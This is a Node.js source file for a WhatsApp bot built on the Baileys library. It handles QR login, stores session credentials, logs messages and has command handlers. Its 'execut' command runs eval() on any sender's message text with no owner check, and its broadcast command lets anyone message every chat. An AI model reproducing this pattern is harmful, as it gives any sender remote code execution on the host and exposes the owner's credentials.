// api zapo
const {
   WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime
   } = require("@adiwajshing/baileys")

// lib
const client = new WAConnection()
const {
 getBuffer, 
 getGroupAdmins, 
 getRandom, 
 start, 
 info, 
 close
  } = require('./lib/functions')
const { fetchJson } = require('./lib/fetcher')
const moment = require("moment-timezone")
const fs = require("fs")
const qrcode = require('qrcode-terminal')
const { color } = require('./lib/color')
const time = moment.tz('Asia/Jakarta').format('HH:mm:ss DD:MM:YYYY')

// gerar o qr
client.on('qr', qr => {
   qrcode.generate(qr, { small: true })
   console.log('APONTE A CÂMERA DO WHATSAPP WEB\nPARA O QR-CODE ACIMA')
})


//salvar em json e conexão
client.on('credentials-updated', () => {
const exInfo = client.base64EncodedAuthInfo()
fs.writeFileSync('./sushi.json', JSON.stringify(exInfo, null, '\t'))
post = JSON.parse(fs.readFileSync('./sushi.json'))
console.log(color(post, 'cyan'))
})
fs.existsSync('./sushi.json') && client.loadAuthInfo('./sushi.json')
client.connect();

//depois de ligado, recepção de mensagens 
client.on('chat-update', async (msg) => {
try {
if (!msg.hasNewMessage) return
msg = JSON.parse(JSON.stringify(msg)).messages[0]
if (!msg.message) return
if (msg.key && msg.key.remoteJid == 'status@broadcast') return
if (msg.key.fromMe) return
global.blocked
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const type = Object.keys(msg.message)[0]
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
prefix = '/'
body = (type === 'conversation' && msg.message.conversation.startsWith(prefix)) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption.startsWith(prefix) ? msg.message.imageMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption.startsWith(prefix) ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text.startsWith(prefix) ? msg.message.extendedTextMessage.text : ''
budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''

//start comandos
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const arg = budy.slice(command.length + 2, budy.length)
const botNumero = client.user.jid
const isGroup = from.endsWith('@g.us')
const sender = msg.key.fromMe ? client.user.jid : isGroup ? msg.participant : msg.key.remoteJid
pushname = client.contacts[sender] != undefined ? client.contacts[sender].vname || client.contacts[sender].notify : undefined
const totalchat = await client.chats.all()

			const reply = (teks) => {
				client.sendMessage(from, teks, text, {quoted:msg})
			}
			const sendImage = (teks) => {
		    client.sendMessage(from, teks, image, {quoted:msg})
		    }
			const sendMess = (hehe, teks) => {
				client.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : client.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": memberr}})
			}

// dono e futuramente outros 
const donoCTT = ["554792091566@s.whatsapp.net"]; 
const isDono = donoCTT.includes(sender)

// definição grupo
const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

// ativar e desativar 
const isBotGroupAdmins = groupAdmins.includes(botNumero) || false
const isGroupAdmins = groupAdmins.includes(sender) || false

// terminal 
const chats = type == 'conversation' || type == 'extendedTextMessage'
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))}

	        colors = ['red','white','black','blue','yellow','green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			//_COMANDOS
            if (!isGroup && isCmd) console.log(color('COMANDO RECEBIDO', 'magenta'), color('HORA:', 'orange'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color('COMANDO:'), color(`${command}`), 'DE:', color(pushname))
            if (isCmd && isGroup) console.log(color('COMANDO RECEBIDO', 'magenta'), color('HORA:', 'orange'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color('COMANDO:'), color(`${command}`), 'DE:', color(pushname), 'EM:', color(groupName))

            //_MENSAGENS
            if (!isCmd && isGroup) console.log(color('MENSAGEM RECEBIDA', 'aqua'), color('HORA:', 'orange'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), 'DE:', color(pushname), 'EM:', color(groupName))
            if (!isGroup && !isCmd) console.log(color('MENSAGEM RECEBIDA', 'aqua'), color('HORA:', 'orange'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), 'DE:', color(pushname))
			let authorname = client.contacts[from] != undefined ? client.contacts[from].vname || client.contacts[from].notify : undefined	
			if (authorname != undefined) { } else { authorname = groupName }	
//final Console log			

// INÍCIO DAS CASES || COMANDOS

switch(command) {
case 'execut':
return eval(`${args.join(' ')}`)
break

                    case 'transmitir': 
                    case 'bc': 
                    case 'tm':
					if (args.length < 1) return reply('.......')
					anu = await client.chats.all()
					if (isMedia && !msg.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
						buff = await client.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							client.sendMessage(_.jid, buff, image, {caption: `[ TRANSMIÇÃO DE AVISO ]\n\n${body.slice(4)}`})
						}
						reply('Transmissão enviada com sucesso')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `[ AVISO DE TRANSMISSÃO ]\n\n${body.slice(4)}`)
						}
						reply('Transmissão enviada com sucesso')
					}
					break

}
} catch (e) {
console.log('Erro: %s', color(e, 'red'))
}
})
